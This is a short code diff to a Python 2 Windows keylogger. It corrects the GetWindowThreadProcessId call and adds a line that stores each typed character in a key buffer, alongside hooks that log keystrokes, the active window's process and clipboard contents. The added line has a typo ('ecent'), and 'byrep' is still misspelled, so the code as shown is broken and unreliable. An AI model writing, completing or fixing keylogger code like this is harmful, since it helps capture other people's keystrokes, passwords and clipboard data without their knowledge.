@@ -16,7 +16,7 @@ def get_current_process():
     
     #find the process ID
     pid = c_ulong(0)
-    user32.GetWindowThreadProcessID(hwnd, byrep(pid))
+    user32.GetWindowThreadProcessId(hwnd, byrep(pid))
     
     #store the current process ID
     process_id = "%d" %pid.value
@@ -53,6 +53,7 @@ def KeyStroke(event):
     #if they pressed a standard key
     if event.Ascii > 32 and event.Ascii <127:
         print chr(event.Ascii)
+        key_buffer.append(ecent.Ascii)
         
     else:
         #if ctrl-v, get the value on clipboard
